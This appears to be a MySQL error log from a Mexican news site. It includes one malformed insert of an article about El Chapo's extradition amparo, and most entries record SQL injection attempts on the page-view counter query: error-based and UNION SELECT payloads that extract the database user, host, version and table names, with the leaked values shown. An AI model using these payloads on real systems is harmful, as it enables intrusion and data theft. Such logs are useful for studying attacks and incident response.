+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=4857'A=0
+
+Time : 11:20:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'El Chapo' contra su extradición','chpo.jpg','','','
+
+El Juzgado Décimo de Di' at line 1
+Raw SQL : CALL insertar('nacional','','nacionalprincipal','Sobresee juez amparo de 'El Chapo' contra su extradición','chpo.jpg','','','
+
+El Juzgado Décimo de Distrito en Materia de Amparo Penal en la Ciudad de México informó que en el juicio de amparo 27/2016, promovido por Joaquín Archivaldo Guzmán Loera contra actos del Presidente Constitucional de los Estados Unidos Mexicanos y otras autoridades, consistentes en la orden de extradición y su ejecución, determinó sobreseer con base en la inexistencia de la autoridad señalada como responsable y de los actos reclamados.
+
+Lo anterior, en virtud de que el promovente señaló a la "Procuradora General de Justicia en México", como autoridad responsable, misma que resulta ser inexistente y, por tanto, tampoco puede existir la orden de extradición reclamada.
+<p>
+La resolución destaca que la demostración del acto reclamado es una cuestión de hecho que debe acreditarse con las probanzas idóneas, por ende, cuando las autoridades responsables niegan su existencia, corresponde a la parte quejosa aportar los medios de convicción tendentes a demostrar lo contrario.
+<p>
+Refiere que de acuerdo a la jurisprudencia de la Primera Sala de la Suprema Corte de Justicia de la Nación, en el juicio de amparo indirecto, la parte quejosa tiene la carga procesal de ofrecer pruebas para demostrar la violación de garantías individuales que alega, ya que el que interpone una demanda de amparo, está obligado a establecer, directamente o mediante el informe de la autoridad responsable la existencia del acto que impugna y a justificar, con pruebas, que dicho acto es inconstitucional, aunque, incluso, las autoridades responsables no rindan su informe justificado, caso en el cual, la ley establece la presunción de la existencia de los actos, arrojando en forma total la carga de la prueba al peticionario de garantías, acerca de la inconstitucionalidad de los actos impugnados.
+<p>
+En este sentido, añade que el Director de Amparos A, en ausencia del Secretario de Gobernación; el Director Jurídico Contencioso de la Secretaría de Relaciones Exteriores, en representación del Presidente de los Estados Unidos Mexicanos y del Secretario de Relaciones Exteriores, al rendir su informe justificado negaron la existencia de la orden de extradición, sin que el quejoso hubiese aportado prueba eficaz que desvirtúe tales negativas.
+<p>
+En efecto, ya que aun cuando el peticionario de amparo a través de su autorizado legal, en escrito de 22 de febrero pasado, aportó a este Juzgado una nota periodística publicada en esa fecha, donde se destaca que el Presidente de la República ordenó acelerar el procedimiento de extradición del quejoso, acorde a lo previsto en el numeral 197, del Código Federal de Procedimientos Civiles de aplicación supletoria a la Ley de Amparo, carece de valor probatorio para evidenciar la existencia del acto de molestia reclamado, en razón de que únicamente acredita que en su oportunidad se llevaron al cabo esa publicación, con diversos reportajes y fotografías, pero de ninguna manera demuestra la existencia de la orden de extradición de que se duele el peticionario de amparo. Apoya lo anterior, la tesis aislada la Suprema Corte de Justicia de la Nación.','','','','','','','','')
+
+Time : 10:54:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=926'A=0
+
+Time : 09:48:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=4763'A=0
+
+Time : 08:36:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!opinion!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt(SeLeCt DiStInCt CoNcAt(char(33,126,33),TaBlE_NaMe,char(33,126,33)) FrOm information_schema.TaBlEs WhErE TaBlE_ScHeMa=0x636869687561687561686f79 LiMiT 1,1)) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 08:36:20
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!noticias!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt(SeLeCt DiStInCt CoNcAt(char(33,126,33),TaBlE_NaMe,char(33,126,33)) FrOm information_schema.TaBlEs WhErE TaBlE_ScHeMa=0x636869687561687561686f79 LiMiT 0,1)) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 08:36:18
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt(SeLeCt CoNcAt(char(33,126,33),count(0),char(33,126,33)) FrOm information_schema.TaBlEs WhErE TaBlE_ScHeMa=0x636869687561687561686f79)) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 08:36:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahuahoy!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),DaTaBaSe(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 08:36:12
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 08:36:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chhoy@ps447048.dreamhost.com!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),UsEr(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 00:26:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x3931333' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39
+
+Time : 00:26:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x3931333' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39
+
+Time : 00:26:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x3931333' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39
+
+Time : 00:25:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x3931333' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39
+
+Time : 00:25:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x3931333' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39
+
+Time : 00:25:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x3931333' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39
+
+Time : 00:25:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x3931333' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39
+
+Time : 00:25:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39,0x393133353134353632322e39
+
+Time : 00:25:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UnIoN AlL SeLeCt 0x393133353134353632312e39' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 UnIoN AlL SeLeCt 0x393133353134353632312e39
+
+Time : 00:25:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 00:25:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ABC145ZQ62DWQAFPOIYCFD!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt UnHeX(HeX(CoNcAt(char(33,126,33),0x4142433134355a5136324457514146504f4959434644,char(33,126,33))))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 00:25:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 00:24:37
+SQLSTATE[42S22]: Column not found: 1054 Unknown column 'RK' in 'where clause'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=4861/RK=0
